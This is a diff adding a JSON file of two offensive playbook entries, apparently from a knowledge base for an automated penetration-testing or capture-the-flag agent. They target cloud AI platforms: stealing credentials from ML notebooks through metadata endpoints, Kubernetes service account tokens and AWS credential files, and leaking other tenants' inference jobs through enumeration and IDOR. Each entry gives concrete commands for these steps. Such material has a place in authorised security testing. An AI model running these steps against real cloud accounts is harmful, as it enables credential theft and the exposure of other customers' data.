@@ -1,0 +1,50 @@
+[
+  {
+    "id": "cloud-ai-notebook-escape",
+    "category": "EXPLOIT",
+    "subcategory": "CLOUD",
+    "title": "AI Notebook Escape — Cloud ML Environment SA Token and Credential Discovery",
+    "description": "Cloud AI/ML notebook environments (AWS SageMaker, Google Vertex AI Workbench, Azure ML Studio) run in containers or VMs with access to cloud credentials via service accounts, instance profiles, or metadata services. An attacker with code execution in a notebook can exfiltrate these credentials. Attack: (1) Check IMDS for AWS credentials: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/. (2) Check environment variables: env | grep -iE 'secret|token|key|cred|sagemaker|aws|gcp|azure|api'. (3) Check SageMaker-specific directories: ls /opt/ml/, cat /opt/ml/metadata/resource-metadata.json. (4) Check K8s SA token: cat /var/run/secrets/kubernetes.io/serviceaccount/token (if running on EKS with K8s integration). (5) Check Jupyter config: ls ~/.jupyter/, ~/.config/, /home/jupyter/.aws/. (6) Check mounted secrets: ls /run/secrets/, /etc/secrets/. (7) If K8s SA token is found, use kubectl_auth_check, kubectl_get_pods, kubectl_get_secrets to enumerate cluster resources. (8) Use extracted cloud credentials to access cloud services (S3, DynamoDB, Lambda, etc.) via aws_cli.",
+    "techniques": [
+      "AWS SageMaker: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "SageMaker metadata: cat /opt/ml/metadata/resource-metadata.json",
+      "Environment scan: env | grep -iE 'secret|token|key|aws|gcp|azure|cred|sagemaker'",
+      "K8s SA token: cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+      "Jupyter config files: cat ~/.jupyter/jupyter_notebook_config.py, ~/.aws/credentials",
+      "Check capabilities: capsh --print (may have SYS_ADMIN or CAP_NET_RAW for network ML jobs)",
+      "Run container_recon_env to search /proc/*/environ for credentials",
+      "Check: ls -la /opt/ml/input/data/ (training data may contain credentials or flags)",
+      "Vertex AI: curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor:Google'"
+    ],
+    "indicators": ["Running in Jupyter/SageMaker/Vertex AI notebook environment", "IMDS or metadata endpoint reachable", "K8s service account token mounted", "SageMaker execution role attached", "GPU/ML libraries installed (tensorflow, pytorch, sagemaker)"],
+    "prerequisites": ["Code execution in an AI/ML notebook", "Network access to cloud metadata endpoints", "K8s pod with SA token (if running on EKS/ACK/GKE)"],
+    "tools": ["check_cloud_metadata", "container_recon_env", "sa_token_read", "aws_cli"],
+    "tags": ["ai", "ml", "notebook", "sagemaker", "jupyter", "escape", "sa-token", "imds", "credentials", "vertex-ai"],
+    "confidence": 0.85,
+    "mitre_attack": "T1522"
+  },
+  {
+    "id": "cloud-ai-inference-queue",
+    "category": "EXPLOIT",
+    "subcategory": "CLOUD",
+    "title": "Shared AI Inference Queue — Multi-Tenant Data Leak in Model Serving Infrastructure",
+    "description": "Multi-tenant AI inference platforms (SageMaker batch transform, Vertex AI prediction, Azure ML endpoints) handle inference requests from multiple tenants through shared queues. Tenant isolation failures can leak other tenants' input data, model outputs, or training data. Attack: (1) Enumerate inference endpoints: aws sagemaker list-endpoints, list-models, list-transform-jobs. (2) Access the inference queue/endpoint API directly — see if job IDs from other tenants are visible or predictable. (3) Submit a request to enumerate queued jobs: curl POST INFERENCE_API/enum or aws sagemaker list-transform-jobs. (4) If job metadata includes other tenants' jobs (non-isolated namespace), retrieve their job results: aws sagemaker describe-transform-job --transform-job-name VICTIM_JOB. (5) For HTTP-based inference APIs, try IDOR-style access: infer other tenants' job IDs or input data by manipulating job_id or request_id parameters. (6) Check for shared storage: model artifacts in S3 may contain training data, inference results, or batch job outputs from other tenants. (7) Check for shared container registries or model repositories that may expose other tenants' model code.",
+    "techniques": [
+      "List inference endpoints: aws sagemaker list-endpoints, aws sagemaker list-models, aws sagemaker list-transform-jobs",
+      "Enumerate shared queue: curl -X POST INFERENCE_API/enum or aws sagemaker list-transform-jobs --name-contains ''",
+      "IDOR on job IDs: try sequential job IDs or predictable job naming (tenant-job-001, tenant-job-002)",
+      "Retrieve victim job: aws sagemaker describe-transform-job --transform-job-name VICTIM_JOB_NAME",
+      "Check S3 model artifacts: aws s3 ls s3://sagemaker-MODEL_BUCKET/ --recursive",
+      "Invoke endpoint directly: aws sagemaker-runtime invoke-endpoint --endpoint-name NAME --body '{\"inputs\":\"test\"}' output.json",
+      "Check for batch transform output in shared S3: aws s3 ls s3://BATCH_OUTPUT_BUCKET/prefix/",
+      "List training jobs: aws sagemaker list-training-jobs — may expose training data locations",
+      "Check ECR registries: aws ecr describe-repositories"
+    ],
+    "indicators": ["Multi-tenant AI/ML inference infrastructure", "Shared job queue between tenants", "Predictable job IDs or sequential naming", "S3 bucket containing model artifacts shared across tenants", "SageMaker, Vertex AI, or Azure ML service detected"],
+    "prerequisites": ["Access to AI inference API or AWS CLI with SageMaker permissions", "Multi-tenant inference queue in use", "S3 bucket for model artifacts accessible", "Job ID enumeration possible"],
+    "tools": ["aws_cli", "curl_get"],
+    "tags": ["ai", "ml", "inference", "multi-tenant", "data-leak", "sagemaker", "vertex-ai", "model-serving", "queue"],
+    "confidence": 0.75,
+    "mitre_attack": "T1530"
+  }
+]
